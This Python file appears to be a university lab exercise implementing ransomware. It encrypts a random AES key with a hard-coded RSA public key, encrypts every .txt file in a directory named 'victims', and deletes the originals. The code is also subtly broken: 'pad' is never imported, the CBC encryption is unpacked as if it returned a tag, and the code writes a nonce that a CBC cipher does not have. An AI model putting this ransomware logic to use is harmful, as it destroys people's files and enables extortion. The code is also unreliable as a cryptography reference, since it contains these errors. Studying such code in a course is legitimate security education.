from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
import os

# Generate a random 16-byte shared key
def rand_key_generator():
    return get_random_bytes(16)

# Encrypt the shared key using RSA public key
def encrypt_key(public_key, shared_key):
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_key = cipher_rsa.encrypt(shared_key)
    return encrypted_key

# Encrypt all .txt files in a directory using the shared key
def encrypt_files_in_directory(directory_path, shared_key):
    for file_name in os.listdir(directory_path):
        if file_name.endswith('.txt'):
            file_path = os.path.join(directory_path, file_name)
            with open(file_path, 'rb') as file_data:
                plaintext = file_data.read()

            # Initialize the AES cipher and update it with the plaintext
            cipher_aes = AES.new(shared_key, AES.MODE_CBC)
            ciphertext, tag = cipher_aes.encrypt(pad(plaintext, AES.BLOCK_SIZE))

            # Write the encrypted content to a new file
            encrypted_file_path = f"{file_path}.encrypted"
            with open(encrypted_file_path, 'wb') as encrypted_file:
                encrypted_file.write(cipher_aes.nonce)
                encrypted_file.write(ciphertext)

            # Delete the original plaintext file
            os.remove(file_path)
            print(f"Encrypted and deleted: {file_path}")


# Get the hard-coded RSA public key string
def get_public_key_str():
    return """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFjdname3JKXjZr5T8ZVnuJO3G
anXO52sFxabSch32PIqkF31/EMj/nBRoEJbTFUQ32VfgTX2GJzNGRBThyjymiIZM
s4EGWwU534KlsUAnLG0E3auCHm5e3qq6v8OiQAVb9ZijVtowo6lonHdjvTISBTsO
gt5hb5m5vYKzg0Q3PQIDAQAB
-----END PUBLIC KEY-----"""

def main():
    # Get the RSA public key
    public_key_str = get_public_key_str()
    public_key = RSA.import_key(public_key_str)

    # Generate and encrypt the shared key
    shared_key = rand_key_generator()
    shared_key_encrypt = encrypt_key(public_key, shared_key)

    # Save the encrypted shared key to a file
    encrypted_key_file_path = 'EncryptedSharedKey'
    with open(encrypted_key_file_path, 'wb') as encrypted_key_file:
        encrypted_key_file.write(shared_key_encrypt)

    # Encrypt all .txt files in the specified directory
    directory_path = '/home/cse/Lab3/Q6files/victims'
    encrypt_files_in_directory(directory_path, shared_key)

if __name__ == "__main__":
    main()
